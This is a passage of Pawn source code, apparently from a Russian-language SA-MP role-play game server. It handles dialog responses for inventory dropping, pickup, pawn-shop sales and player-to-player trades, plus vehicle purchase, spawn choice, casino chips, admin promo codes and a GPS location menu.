			        case 1:
					{
						if(CheckUseGun(playerid,PlayerItem1[playerid][PlayerUseList[playerid][MAX_LIST]])==1){return true;}
						ShowPlayerDialog(playerid,D_INVENT+5,DIALOG_STYLE_INPUT,"Передача предмета","{FFFFFF}Введите ид игрока,\nКоторому Вы хотите передать предмет!","Дальше","Выйти");
					}
			        case 2:
					{
					    new id = PlayerItem1[playerid][PlayerUseList[playerid][MAX_LIST]];
					    if(CheckUseGun(playerid,PlayerItem1[playerid][PlayerUseList[playerid][MAX_LIST]])==1){return true;}
					    new s = PlayerUseList[playerid][MAX_LIST];
					    switch(Item[id][iStek])
					    {
					        case 0:
					        {
					            PlayerDropItemId(playerid,id,1);
					            PlayerItem2[playerid][s]=0;
						        SaveItem(playerid,s);
						        UpDateInv(playerid);
						        new string[70];
								format(string, sizeof(string), "%s что-то выкинул в сторону", GetName(playerid));
								ProxDetector(15, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						        SendClientMessage(playerid,COLOR_GREY,"Вы успешно выкинули предмет!");
					        }
							default:ShowPlayerDialog(playerid,D_INVENT+1,DIALOG_STYLE_INPUT,"Выкинуть предмет","Введите сумму предметов,\nКоторую Вы хотите выкинуть!","Дальше","Выйти");
					    }
					}
					case 3:
					{
					    new id = PlayerItem1[playerid][PlayerUseList[playerid][MAX_LIST]];
					    if(CheckUseGun(playerid,PlayerItem1[playerid][PlayerUseList[playerid][MAX_LIST]])==1){return true;}
					    new s = PlayerUseList[playerid][MAX_LIST];
					    switch(Item[id][iStek])
					    {
					        case 0:
					        {
					            PlayerItem2[playerid][s]=0;
						        SaveItem(playerid,s);
						        UpDateInv(playerid);
								GiveMoney(playerid, Item[id][iLom]);
						        new string[70];
								format(string, sizeof(string), "%s продал в ломбард '%s'", GetName(playerid),Item[id][iName]);
								ProxDetector(15, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						        SendMes(playerid,COLOR_GREY,"Вы успешно продали предмет за '%dр'",Item[id][iLom]);
					        }
							default:ShowPlayerDialog(playerid,D_INVENT+13,DIALOG_STYLE_INPUT,"Ломбард","Введите сумму предметов,\nКоторую Вы хотите продать!","Дальше","Выйти");
					    }
					}
			    }
			}
		}
		case D_INVENT+4:
		{
		    if(response)
		    {
		        if(!strlen(inputtext))return SendClientMessage(playerid,COLOR_GREY,"Вы ничего не ввели!");
		        if(strval(inputtext) < 1 || strval(inputtext) > 1000000) return SendClientMessage(playerid, COLOR_GREY, "Число может быть не больше 1000000");
		        new i = GetPVarInt(playerid,"IDplayaInv");
		        new id = DropItem[i][dIDItem], inter, world;
		        inter = GetPlayerInterior(playerid);
				world = GetPlayerVirtualWorld(playerid);
		        if(!IsPlayerInRangeOfPoint(playerid,1.5,DropItem[i][dX],DropItem[i][dY],DropItem[i][dZ]))return SendClientMessage(playerid,COLOR_GREY,"Предмет не найден!");
		        if(DropItem[i][dInt] != inter){return SendClientMessage(playerid,COLOR_GREY,"Предмет не найден!");}
		    	if(DropItem[i][dWorld] != world){return SendClientMessage(playerid,COLOR_GREY,"Предмет не найден!");}
		        if(DropItem[i][dPiece]<strval(inputtext))return SendClientMessage(playerid,COLOR_GREY,"Нет столько предметов!");
		        if(CheckMaxVes(playerid,id,strval(inputtext))==1)return true;
		        new slot;
				if(Item[id][iStek]==1)
				{
				    new stek=0;
					for(new si = 16; si > 0; si --)
			        {
			            if(PlayerItem1[playerid][si]==id){stek=1;slot=si;break;}
			        }
			        if(stek==0)
			        {
						for(new si = 16; si > 0; si --)
			            {
			                if(PlayerItem1[playerid][si]==0){stek=0;slot=si;break;}
			            }
			        }
				}
				else
				{
					for(new si = 16; si > 0; si --)
			        {
			            if(PlayerItem1[playerid][si]==0){slot=si;break;}
			        }
				}
				if(slot==0)return SendClientMessage(playerid,COLOR_GREY,"Нет свободных ячеек или места!");
		        GiveItem(playerid, id, strval(inputtext));
		    	SaveItem(playerid,slot);
		    	DropItem[i][dPiece]-=strval(inputtext);
		    	ApplyAnimation(playerid,"MISC","Case_pickup",4.1,0,0,0,0,500);
		    	new string[120];
		    	format(string,sizeof(string),"Вы успешно подняли предмет: %s в количестве: %i",Item[DropItem[i][dIDItem]][iName],strval(inputtext));
		    	SendClientMessage(playerid,-1,string);
		    	if(DropItem[i][dPiece]<=0)
		    	{
		    	    DropItem[i][dX]=0;
		            DropItem[i][dY]=0;
		            DropItem[i][dZ]=0;
		            DropItem[i][dIDItem]=0;
					DropItem[i][dPiece]=0;
					DropItem[i][dInt]=0;
					DropItem[i][dWorld]=0;
					DestroyDynamicObject(DropItem[i][dObject]);
					DestroyDynamic3DTextLabel(DropItem[i][dText]);
					new str[60];
		    		format(str, sizeof(str), "DELETE FROM "T_DROPIT" WHERE `Number` = '%i'",i);
		    		mysql_query(dbHandle ,str);
		    	}
		    	else
		    	{
		    	    new string2[140];
					format(string2,sizeof(string2),"%s\n{FFFFFF}В количестве %i\n'C' чтобы подобрать",Item[DropItem[i][dIDItem]][iName],DropItem[i][dPiece]);
					UpdateDynamic3DTextLabelText(DropItem[i][dText],0xFFFFFFFF,string2);
		    	}
		    }
		}
		case D_INVENT+5:
		{
		    if(response)
		    {
		        if(!strlen(inputtext))return SendClientMessage(playerid,COLOR_GREY,"Вы ничего не ввели!");
		        if(!IsPlayerConnected(strval(inputtext))) return SendMess(playerid, MSG_PLAYER_OFFLINE);
		        new Float:p[3];
				GetPlayerPos(strval(inputtext),p[0],p[1],p[2]);
				if(!IsPlayerInRangeOfPoint(playerid,3,p[0],p[1],p[2]))return SendClientMessage(playerid,COLOR_GREY,"Игрок не рядом с вами!");
		        GivePlayer[playerid][0]=strval(inputtext);
		        new id = PlayerItem1[playerid][PlayerUseList[playerid][MAX_LIST]];
		        new s=PlayerUseList[playerid][MAX_LIST];
		        GivePlayer[playerid][4]=s;
		        switch(Item[id][iStek])
		        {
		            case 0:
		            {
				        GivePlayer[playerid][1]=PlayerItem2[playerid][s];
		                ShowPlayerDialog(playerid,D_INVENT+7,DIALOG_STYLE_INPUT,"Передача предмета","{FFFFFF}Введите точную сумму денег\nЗа которую Вы хотите продать предмет.","Дальше","Выйти");
		            }
		            default:ShowPlayerDialog(playerid,D_INVENT+6,DIALOG_STYLE_INPUT,"Передача предмета","{FFFFFF}Введите точное количество предметов\nКоторое Вы хотите продать игроку!","Дальше","Выйти");
		        }

		    }
		}
		case D_INVENT+6:
		{
		    if(response)
		    {
		        if(!strlen(inputtext))return SendClientMessage(playerid,COLOR_GREY,"Вы ничего не ввели!");
		        if(strval(inputtext) < 0 || strval(inputtext) > 1000000) return SendClientMessage(playerid, COLOR_GREY, "Число может быть не больше 1000000");
		        new s=PlayerUseList[playerid][MAX_LIST];
		        if(PlayerItem2[playerid][s]<strval(inputtext))return SendClientMessage(playerid,COLOR_GREY,"У Вас нет столько предметов!");
		        GivePlayer[playerid][1]=strval(inputtext);
                ShowPlayerDialog(playerid,D_INVENT+7,DIALOG_STYLE_INPUT,"Передача предмета","{FFFFFF}Введите точную сумму денег\nЗа которую Вы хотите продать предмет.","Дальше","Выйти");
			}
		}
		case D_INVENT+7:
		{
		    if(response)
		    {
		        if(!strlen(inputtext))return SendClientMessage(playerid,COLOR_GREY,"Вы ничего не ввели!");
		        if(strval(inputtext) < 0 || strval(inputtext) > 1000000) return SendClientMessage(playerid, COLOR_GREY, "Число может быть не больше 1000000");
		        new id = PlayerItem1[playerid][PlayerUseList[playerid][MAX_LIST]];
		        new string[300];
		        GivePlayer[playerid][2]=strval(inputtext);
		        format(string,sizeof(string),"{FFFFFF}Вы действительно хотите продать след. итем?\n{FFFFFF}Название предмета: %s\n{FFFFFF}Стоимость предмета: %iр\n{FFFFFF}Количество предмета: %i\n{FFFFFF}Вес предмета: %i",Item[id][iName],GivePlayer[playerid][2],GivePlayer[playerid][1],Item[id][iGG]*GivePlayer[playerid][1]);
                ShowPlayerDialog(playerid,D_INVENT+8,DIALOG_STYLE_MSGBOX,"Подтверждение",string,"Дальше","Выйти");
		    }
		}
		case D_INVENT+8:
		{
		    if(response)
		    {
		        new id = PlayerItem1[playerid][PlayerUseList[playerid][MAX_LIST]];
		        new s = PlayerUseList[playerid][MAX_LIST];
		        new string[350];
		        SendClientMessage(playerid,COLOR_GREY,"Ожидайте, пока игрок согласится.");
		        format(string,sizeof(string),"{FFFFFF}Вы действительно хотите купить след. итем?\n{FFFFFF}Название предмета: %s\n{FFFFFF}Стоимость предмета: %iр\n{FFFFFF}Количество предмета: %i\n{FFFFFF}Вес предмета: %i\n{FFFFFF}В сумку вместится еще: %iг",Item[id][iName],GivePlayer[playerid][2],GivePlayer[playerid][1],Item[id][iGG]*GivePlayer[playerid][1],PI[GivePlayer[playerid][0]][pSprunk]-PlayerVesItem[GivePlayer[playerid][0]]);
                ShowPlayerDialog(GivePlayer[playerid][0],D_INVENT+9,DIALOG_STYLE_MSGBOX,"Подтверждение",string,"Выйти","Принять");
                GivePlayer[GivePlayer[playerid][0]][0]=playerid;// Id
                GivePlayer[GivePlayer[playerid][0]][1]=GivePlayer[playerid][1];// Kol Item
                GivePlayer[GivePlayer[playerid][0]][2]=GivePlayer[playerid][2];// Prise
                GivePlayer[GivePlayer[playerid][0]][3]=id;// Item id
                GivePlayer[GivePlayer[playerid][0]][4]=s;// slot id
		    }
		}
		case D_INVENT+9:
		{
		    if(!response)
		    {
		        new playa=GivePlayer[playerid][0];
		        new s=GivePlayer[playerid][4];
		        new kolv=GivePlayer[playerid][1];
		        new id = GivePlayer[playerid][3];
		        new money=GivePlayer[playerid][2];
		        if(GetMoney(playerid) < money) return SendClientMessage(playerid, COLOR_GREY, "У Вас недостаточно денег"),SendClientMessage(playa,COLOR_GREY,"У игрока недостаточно денег!");
		        if(CheckMaxVes(playerid,id,kolv)==1){SendClientMessage(playa,COLOR_GREY,"Сумка игрока полна!");return true;}

				new Float:p[3];
				GetPlayerPos(playa,p[0],p[1],p[2]);
				if(!IsPlayerInRangeOfPoint(playerid,3,p[0],p[1],p[2]))return SendClientMessage(playerid,COLOR_GREY,"Игрок не рядом с вами!"),SendClientMessage(playa,COLOR_GREY,"Вы слишком далеко!");


                if(PlayerItem2[playa][s]<kolv)return SendClientMessage(playerid,COLOR_GREY,"У игрока нет столько предметов!"),SendClientMessage(playa,COLOR_GREY,"У Вас нет столько предметов!");

				GiveMoney(playerid, -money);
				GiveMoney(playa, money);

				new slot;
				if(Item[id][iStek]==1)
				{
				    new stek=0;
					for(new si = 16; si > 0; si --)
		            {
		                if(PlayerItem1[playerid][si]==id){stek=1;slot=si;break;}
		            }
		            if(stek==0)
		            {
						for(new si = 16; si > 0; si --)
			            {
			                if(PlayerItem1[playerid][si]==0){stek=0;slot=si;break;}
			            }
		            }
				}
				else
				{
					for(new si = 16; si > 0; si --)
		            {
		                if(PlayerItem1[playerid][si]==0){slot=si;break;}
		            }
				}
				PlayerItem1[playerid][slot]=id;
				PlayerItem2[playerid][slot]+=kolv;
				format(PlayerItem3[playerid][slot],32,"%s",PlayerItem3[playa][slot]);
				if(PlayerItem2[playa][s]-kolv<=0)
				{
					PlayerItem1[playa][s]=0;
					PlayerItem2[playa][s]=0;
					format(PlayerItem3[playa][s],1,"");
				}
				else
				{
					PlayerItem2[playa][s]-=kolv;
				}
				SaveItem(playerid,slot);
				SaveItem(playa,s);
				UpDateInv(playerid);
				UpDateInv(playa);

				new string[70];
				format(string, sizeof(string), "%s передает что-то в руки %s", GetName(playa),GetName(playerid));
				ProxDetector(15, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				return SendClientMessage(playa,COLOR_GREY,"Вы успешно продали предмет!"),SendClientMessage(playerid,COLOR_GREY,"Вы успешно купили предмет!");
			}
			else
			{
				SendClientMessage(playerid,COLOR_GREY,"Вы отказались от сделки"),SendClientMessage(GivePlayer[playerid][0],COLOR_GREY,"Игрок отказался от сделки");
			}
		}
		case D_INVENT+10:
		{
			if(response)
			{
			    PlayerUseList[playerid][MAX_LIST]=PlayerUseList[playerid][listitem];
			    new playa=GetPVarInt(playerid,"IDplayaInv");
			    new str[45];
			    format(str,sizeof(str),"Предмет: %s",Item[PlayerItem1[playa][PlayerUseList[playerid][MAX_LIST]]][iName]);
			    ShowPlayerDialog(playerid,D_INVENT+11,DIALOG_STYLE_LIST,str, "Конфисковать", "Выбрать", "Выйти");
			}
		}
		case D_INVENT+11:
		{
		    if(response)
		    {
			    new playa=GetPVarInt(playerid,"IDplayaInv");
		        new id = PlayerItem1[playa][PlayerUseList[playerid][MAX_LIST]];
			    //if(CheckUseGun(playa,PlayerItem1[playa][PlayerUseList[playerid][MAX_LIST]])==1){return SendClientMessage(playerid,COLOR_GREY,"Вы не можете достать этот предмет пока игрок его использует!");}
			    new s=PlayerUseList[playerid][MAX_LIST];
			    switch(Item[id][iStek])
			    {
			        case 0:
			        {
					    new newslot;
						if(CheckMaxVes(playerid,id,1,newslot)==1)return true;
				        PlayerItem1[playerid][s]=id;
				        PlayerItem2[playerid][s]=1;
				        format(PlayerItem3[playerid][s],32,"%s",PlayerItem3[playa][s]);
				        SaveItem(playerid,s);
				        UpDateInv(playerid);
			            PlayerItem2[playa][s]=0;
				        SaveItem(playa,s);
				        UpDateInv(playa);
			        }
					default:ShowPlayerDialog(playerid,D_INVENT+12,DIALOG_STYLE_INPUT,"Конфисковать","Введите сумму предметов,\nКоторую Вы хотите конфисковать!","Дальше","Выйти");
			    }
		    }
		}
		case D_INVENT+12:
		{
		    if(response)
		    {
		        if(!strlen(inputtext))return SendClientMessage(playerid,COLOR_GREY,"Вы ничего не ввели!");
                if(strval(inputtext) < 1 || strval(inputtext) > 1000000) return SendClientMessage(playerid, COLOR_GREY, "Число может быть не больше 1000000");
			    new playa=GetPVarInt(playerid,"IDplayaInv");
			    new id = PlayerItem1[playa][PlayerUseList[playerid][MAX_LIST]];
			    new s=PlayerUseList[playerid][MAX_LIST];
		        new kolv=0;
		        if(PlayerItem2[playa][s]<=strval(inputtext)){kolv=PlayerItem2[playa][s];}
				else if(PlayerItem2[playa][s]>=strval(inputtext)){kolv=strval(inputtext);}
			    new newslot;
				if(CheckMaxVes(playerid,id,kolv,newslot)==1)return true;
		        PlayerItem1[playerid][s]=id;
		        PlayerItem2[playerid][s]=1;
		        format(PlayerItem3[playerid][s],32,"%s",PlayerItem3[playa][s]);
		        SaveItem(playerid,s);
		        UpDateInv(playerid);
		        PlayerItem2[playa][s]-=strval(inputtext);
		        SaveItem(playa,s);
		        UpDateInv(playa);
		    }
		}
		case D_INVENT+13:
		{
		    if(response)
		    {
		        if(!strlen(inputtext))return SendClientMessage(playerid,COLOR_GREY,"Вы ничего не ввели!");
		        if(strval(inputtext) < 1 || strval(inputtext) > 1000000) return SendClientMessage(playerid, COLOR_GREY, "Число может быть не больше 1000000");
			    new id=PlayerItem1[playerid][PlayerUseList[playerid][MAX_LIST]];
			    new s=PlayerUseList[playerid][MAX_LIST];
		        //new kolv=0;
		        //if(PlayerItem2[playerid][s]<=strval(inputtext)){kolv=PlayerItem2[playerid][s];}
				//else if(PlayerItem2[playerid][s]>=strval(inputtext)){kolv=strval(inputtext);}
		        PlayerItem2[playerid][s]-=strval(inputtext);
		        SaveItem(playerid,s);
		        UpDateInv(playerid);
				GiveMoney(playerid, Item[id][iLom]);
		        new string[70];
				format(string, sizeof(string), "%s продал в ломбард '%s'", GetName(playerid),Item[id][iName]);
				ProxDetector(15, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		        SendMes(playerid,COLOR_GREY,"Вы успешно продали предмет за '%dр'",Item[id][iLom]);
		    }
		}
		case D_INVENT+14:
		{
			if(response)
			{
			    new id = PlayerItem1[playerid][PlayerUseList[playerid][MAX_LIST]];
			    if(CheckUseGun(playerid,PlayerItem1[playerid][PlayerUseList[playerid][MAX_LIST]])==1){return true;}
			    new s = PlayerUseList[playerid][MAX_LIST];
			    switch(Item[id][iStek])
			    {
       				case 0:
		        	{
           				PlayerItem2[playerid][s]=0;
			        	SaveItem(playerid,s);
				        UpDateInv(playerid);
						GiveMoney(playerid, Item[id][iLom]);
				        new string[70];
						format(string, sizeof(string), "%s продал в ломбард '%s'", GetName(playerid),Item[id][iName]);
						ProxDetector(15, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
      					SendMes(playerid,COLOR_GREY,"Вы успешно продали предмет за '%dр'",Item[id][iLom]);
			        }
					default:ShowPlayerDialog(playerid,D_INVENT+13,DIALOG_STYLE_INPUT,"Ломбард","Введите сумму предметов,\nКоторую Вы хотите продать!","Дальше","Выйти");
				}
			}
		}
		case D_JOINCARS+4:
		{
			if(!response) return 1;
			BuyCar(playerid);
		}
		case D_JOINCARS+5:
		{
			if(!response) return 1;
			BuyCloseCar(playerid);
			SendClientMessage(playerid, COLOR_RED, "Вы отменили покупку транспорта");
		}
		case D_SETSPAWN:
		{
		    if(!response) return 1;
		    switch(listitem)
			{
				case 0:
				{
					PI[playerid][pSpawnChange] = 0;
				}
				case 1:
				{
					if(!GetPlayerHouse(playerid))
						return SendClientMessage(playerid, C_RED, "У Вас нет дома");

					PI[playerid][pSpawnChange] = 1;
				}
				case 2:
				{
					if(PI[playerid][pMember] == 0)
						return SendClientMessage(playerid, C_RED, "Вы не состоите в организации");

					PI[playerid][pSpawnChange] = 2;
				}
				case 3:
				{
					if(PI[playerid][P_ENTRANCE] == -1 || PI[playerid][P_ROOM] == -1)
						return SendClientMessage(playerid, C_RED, "У Вас нет квартиры");

					PI[playerid][pSpawnChange] = 3;
				}
				case 4:
				{
					if(PI[playerid][P_FAMILY] == 0)
						return SendClientMessage(playerid, C_RED, "Вы не состоите в семье");

					if(GetFamilyData(PI[playerid][P_FAMILY]-1, F_SPAWN) == false)
						return SendClientMessage(playerid, C_RED, "Создатель запретил появляться в семейном доме");

					PI[playerid][pSpawnChange] = 4;
				}
			}
			MysqlUpdatePlayerInt(playerid, "spawnchange", PI[playerid][pSpawnChange]);
			SendClientMessage(playerid, COLOR_BLUE, "Ваше место появления в игре изменено");
		}
		case D_BUYFISHKI:
		{
		    if(!response) return 1;
	        switch(listitem)
	        {
	            case 0: ShowPlayerDialog(playerid, D_BUYFISHKI+1, DIALOG_STYLE_INPUT, "Обменять деньги на фишки", "{FFFFFF}Введите количество фишек, которые хотите обменять\n\t1 рубль - 1 фишка", "Далее", "Назад");
	            case 1: ShowPlayerDialog(playerid, D_BUYFISHKI+2, DIALOG_STYLE_INPUT, "Обменять фишки на деньги", "{FFFFFF}Введите количество денег, которые хотите обменять\n\t1 фишка - 1 рубль", "Далее", "Назад");
	        }
		}
		case D_PROMO:
		{
		    if(!response) return 1;
		    switch(listitem)
		    {
		        case 0: ShowPlayerDialog(playerid,D_PROMO+1,DIALOG_STYLE_INPUT,"Создание промокода | {FE6060}Шаг: 1","{FFFFFF}Вам необходимо придумать промокод\nДлина промокода должна быть от 1 до 16 символов, состоящая из цифр и букв латинского алфавита\n\nВведите промокод в строчку ниже:","Далее","Назад");
				case 1: mysql_function_query(dbHandle, "SELECT * FROM `promo` WHERE activate = '0' AND block = '0'", true, "ShowDPromo", "i", playerid);
				case 2: mysql_function_query(dbHandle, "SELECT * FROM `promo` WHERE activate = '1'", true, "ShowAPromo", "i", playerid);
				case 3: mysql_function_query(dbHandle, "SELECT * FROM `promo` WHERE block = '1'", true, "ShowBPromo", "i", playerid);
				case 4: ShowPlayerDialog(playerid,D_PROMO+2,DIALOG_STYLE_INPUT,"{F66B6D}Блокировка промокода","{FFFFFF}Введите ниже промокод, который хотите заблокировать:","Далее","Назад");
				case 5: ShowPlayerDialog(playerid,D_PROMO+3,DIALOG_STYLE_INPUT,"{F66B6D}Удаление промокода","{FFFFFF}Введите ниже промокод, который хотите удалить:","Далее","Назад");
			}
		}
		case D_PROMO+2:
		{
		    if(!response)
		    {
		        return ShowPlayerDialog(playerid,D_PROMO,DIALOG_STYLE_LIST,"{F2E70F}Меню промокодов","\
			    1. Создать промокод \n\
			    2. Действующие промокоды \n\
				3. Активированные промокоды \n\
				4. Заблокированные промокоды \n\
				{F66B6D}5. Заблокировать промокод \n\
				{F66B6D}6. Удалить промокод","Далее","Выход");
		    }
		    new qstring[128];
     		mysql_format(dbHandle, qstring, sizeof(qstring), "SELECT * FROM `promo` WHERE `name`='%e'", inputtext);
       	 	mysql_tquery(dbHandle, qstring, "BlockPromo", "is", playerid,inputtext);
		}
		case D_PROMO+3:
		{
		    if(!response)
		    {
		        return ShowPlayerDialog(playerid,D_PROMO,DIALOG_STYLE_LIST,"{F2E70F}Меню промокодов","\
			    1. Создать промокод \n\
			    2. Действующие промокоды \n\
				3. Активированные промокоды \n\
				4. Заблокированные промокоды \n\
				{F66B6D}5. Заблокировать промокод \n\
				{F66B6D}6. Удалить промокод","Далее","Выход");
		    }
   		    new qstring[128];
     		mysql_format(dbHandle, qstring, sizeof(qstring), "SELECT * FROM `promo` WHERE `name`='%e'", inputtext);
       	 	mysql_tquery(dbHandle, qstring, "DeletePromo", "is", playerid,inputtext);
		}
		case D_PROMO+1:
		{
		    if(!response)
		    {
		        ShowPlayerDialog(playerid,D_PROMO,DIALOG_STYLE_LIST,"{F2E70F}Меню промокодов","\
			    1. Создать промокод \n\
			    2. Действующие промокоды \n\
				3. Активированные промокоды \n\
				4. Заблокированные промокоды \n\
				{F66B6D}5. Заблокировать промокод \n\
				{F66B6D}6. Удалить промокод","Далее","Выход");
				return 1;
		    }
		    if(strlen(inputtext) < 1 || strlen(inputtext) > 16) return ShowPlayerDialog(playerid,D_PROMO+1,DIALOG_STYLE_INPUT,"Создание промокода | {FE6060}Шаг: 1","{FFFFFF}Вам необходимо придумать промокод\nДлина промокода должна быть от 1 до 16 символов, состоящая из цифр и букв латинского алфавита\n\nВведите промокод в строчку ниже:","Далее","Назад");
			SetPVarString(playerid,"PROMO",inputtext);

			STRING_GLOBAL[0] = EOS;
			strcat(STRING_GLOBAL,"{FFFFFF}Теперь необходимо ввести тип приза, количество выигрыша, количество активаций\n\n{4AA9CF}Типы:\n");
			strcat(STRING_GLOBAL,"{FFFFFF}1. VIP аккаунт\n");
			strcat(STRING_GLOBAL,"2. Игровая валюта\n");
			strcat(STRING_GLOBAL,"3. Кредиты\n\n");
			strcat(STRING_GLOBAL,"Если указан тип '1', то в качестве количества приза - указываете дни, в течении которых будет действовать VIP аккаунт\n");
			strcat(STRING_GLOBAL,"Если указаны типы '2' и '3', то соответственно указываете количество игровой валюты, и кредитов для выигрыша.\n\n");
			strcat(STRING_GLOBAL,"{F6F7D8}Указывать все значения нужно через запятую!\n");
			strcat(STRING_GLOBAL,"Пример: 1,30,10\n");
			strcat(STRING_GLOBAL,"Где 1 - тип(VIP), 30 - кол-во дней, 10 - число активаций");
			ShowPlayerDialog(playerid,D_PROMO+4,DIALOG_STYLE_INPUT,"Создание промокода | {FE6060}Шаг: 2", STRING_GLOBAL,"Далее","Назад");
		}
		case D_PROMO+4:
		{
		    if(!response)
			{
			    STRING_GLOBAL[0] = EOS;
			    strcat(STRING_GLOBAL,"{FFFFFF}Теперь необходимо ввести тип приза, количество выигрыша, количество активаций\n\n{4AA9CF}Типы:\n");
				strcat(STRING_GLOBAL,"{FFFFFF}1. VIP аккаунт\n");
				strcat(STRING_GLOBAL,"2. Игровая валюта\n");
				strcat(STRING_GLOBAL,"3. Кредиты\n\n");
				strcat(STRING_GLOBAL,"Если указан тип '1', то в качестве количества приза - указываете дни, в течении которых будет действовать VIP аккаунт\n");
				strcat(STRING_GLOBAL,"Если указаны типы '2' и '3', то соответственно указываете количество игровой валюты, и кредитов для выигрыша.\n\n");
				strcat(STRING_GLOBAL,"{F6F7D8}Указывать все значения нужно через запятую!\n");
				strcat(STRING_GLOBAL,"Пример: 1,30,10\n");
				strcat(STRING_GLOBAL,"Где 1 - тип приза(VIP), 30 - количество дней, 10 - число доступных активаций промокода");
				ShowPlayerDialog(playerid,D_PROMO+4,DIALOG_STYLE_INPUT,"Создание промокода | {FE6060}Шаг: 2", STRING_GLOBAL,"Далее","Назад");
				return 1;
			}
			new numb[3];
			if(sscanf(inputtext, "p<,>iii",numb[0],numb[1],numb[2]))
			{
			    STRING_GLOBAL[0] = EOS;
			    strcat(STRING_GLOBAL,"{FFFFFF}Теперь необходимо ввести тип приза, количество выигрыша, количество активаций\n\n{4AA9CF}Типы:\n");
				strcat(STRING_GLOBAL,"{FFFFFF}1. VIP аккаунт\n");
				strcat(STRING_GLOBAL,"2. Игровая валюта\n");
				strcat(STRING_GLOBAL,"3. Кредиты\n\n");
				strcat(STRING_GLOBAL,"Если указан тип '1', то в качестве количества приза - указываете дни, в течении которых будет действовать VIP аккаунт\n");
				strcat(STRING_GLOBAL,"Если указаны типы '2' и '3', то соответственно указываете количество игровой валюты, и кредитов для выигрыша.\n\n");
				strcat(STRING_GLOBAL,"{F6F7D8}Указывать все значения нужно через запятую!\n");
				strcat(STRING_GLOBAL,"Пример: 1,30,10\n");
				strcat(STRING_GLOBAL,"Где 1 - тип приза(VIP), 30 - количество дней, 10 - число доступных активаций промокода");
				ShowPlayerDialog(playerid,D_PROMO+4,DIALOG_STYLE_INPUT,"Создание промокода | {FE6060}Шаг: 2",STRING_GLOBAL,"Далее","Назад");
				return 1;
			}
			SetPVarInt(playerid,"TYPEPROMO",numb[0]),SetPVarInt(playerid,"AMOUNTPROMO",numb[1]),SetPVarInt(playerid,"ACTIVATEPROMO",numb[2]);
        	new promoname[16];
         	GetPVarString(playerid, "PROMO", promoname, sizeof(promoname));

         	STRING_GLOBAL[0] = EOS;
         	mysql_format(dbHandle, STRING_GLOBAL, sizeof(STRING_GLOBAL), "SELECT * FROM `promo` WHERE `name`='%e'", promoname);
       	 	mysql_tquery(dbHandle, STRING_GLOBAL, "CreatePromo", "is", playerid,promoname);
		}
		// CTO
		case D_CTO:
		{
			if(response)
			{
				if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находится за рулем своего авто!");
                if(PlayersMenu[playerid] > 0) return SendMess(playerid, MSG_BAC_TEXT_DRAW);
				SetPVarInt(playerid, "UsedCTO", 1);
				new pveh = GetPlayerVehicleID(playerid);
				TogglePlayerControllable(playerid, false);
				SetVehiclePos(pveh, 708.7665, -210.8824, 3006.7998);
				SetVehicleZAngle(pveh, 0.0);
				SetPlayerInterior(playerid, 3);
				SetPlayerVirtualWorld(playerid, playerid);
				SetVehicleVirtualWorld(pveh, playerid);
				LinkVehicleToInterior(pveh, 3);
				PutPlayerInVehicle(playerid, pveh, 0);
				SetPlayerCameraPos(playerid, 706.6107, -205.9091, 3007.7930);
				SetPlayerCameraLookAt(playerid, 706.9498, -206.8483, 3007.6619);

				ShowPlayerTuningMain(playerid);
			}
		}
		case D_GPS:
		{
			if(!response) return 1;

			new locname[40], Float: X, Float: Y, Float: Z;

			switch(listitem)
			{
			    case 0: ShowPlayerDialog(playerid, 10001, DIALOG_STYLE_LIST, "Основные места",
			        "{daa302}[Арзамас]{ffffff} Центр занятости \n\
					{da4100}[Батырево]{ffffff} Военкомат\n\
					{da4100}[Батырево]{ffffff} Автошкола\n\
					{da4100}[Батырево]{ffffff} Утилизация авто\n\
					{daa302}[Арзамас]{ffffff} Автосервис г.Арзамас\n\
					{f94b00}[Южный]{ffffff} Автосервис г.Южный\n\
					{daa302}[Арзамас]{ffffff} Авторынок\n\
					{da4100}[Арзамас]{ffffff} Получение номеров\n\
					{da4100}[Арзамас]{ffffff} Загс\n\
					{f94b00}[Арзамас] {ffffff}Университет", "Поиск", "Назад");
				case 1: ShowPlayerDialog(playerid, 10002, DIALOG_STYLE_LIST, "По работе",
					"{daa302}[Арзамас]{ffffff} Лесопилка\n\
					{daa302}[Арзамас]{ffffff} Грузчик\n\
					{daa302}[Арзамас]{ffffff} Стоянка автобусов\n\
					{daa302}[Арзамас]{ffffff} Стоянка механиков\n\
					{daa302}[Арзамас]{ffffff} Стоянка такси\n\
					{daa302}[Арзамас]{ffffff} База Дальнобойщиков\n\n\
					{da4100}[Бусаево]{ffffff} Ферма\n\n\
					{da4100}[Батырево] {ffffff}Шахта", "Поиск", "Назад");
                case 2: ShowPlayerDialog(playerid, 10003, DIALOG_STYLE_LIST, "Государственные организации",
					"{f9adad}[Батырево]{ffffff} Администрация Области\n\
					{f9adad}[Южный]{ffffff} МВД\n\
					{f9adad}[Арзамас]{ffffff} ГИБДД\n\
					{f9adad}[Арзамас]{ffffff} Арзамас Больница\n\
					{f9adad}[Засекречено]{ffffff} Армия\n\
					{f9adad}[Арзамас]{ffffff} СМИ 'РИТМ'\n\
					{f9adad}[Южный]{ffffff} Федеральная Служба Безопасности", "Поиск", "Назад");
				case 3: ShowPlayerDialog(playerid, 10004, DIALOG_STYLE_LIST, "Нелегальные организации",
					"{e3de5f}[Лыткарино]{ffffff} ОПГ Подольское\n\
					{f9adad}[Батырево]{ffffff} ОПГ Тамбовское\n\
					{e3de5f}[Южный]{ffffff} Русская Мафия", "Поиск", "Назад");
                case 4: ShowPlayerDialog(playerid, 10007, DIALOG_STYLE_LIST, "Банки",
					"{daa302}[Арзамас]{ffffff} Центральный банк\n\
					{da4100}[Батырево]{ffffff} Центральный банк\n\
					{f94b00}[Южный]{ffffff} Центральный банк", "Поиск", "Назад");
                case 5: ShowPlayerDialog(playerid, 10006, DIALOG_STYLE_LIST, "Клубы",
					"{f9adad}[Южный]{ffffff} Клуб '8 Бит'", "Поиск", "Назад");
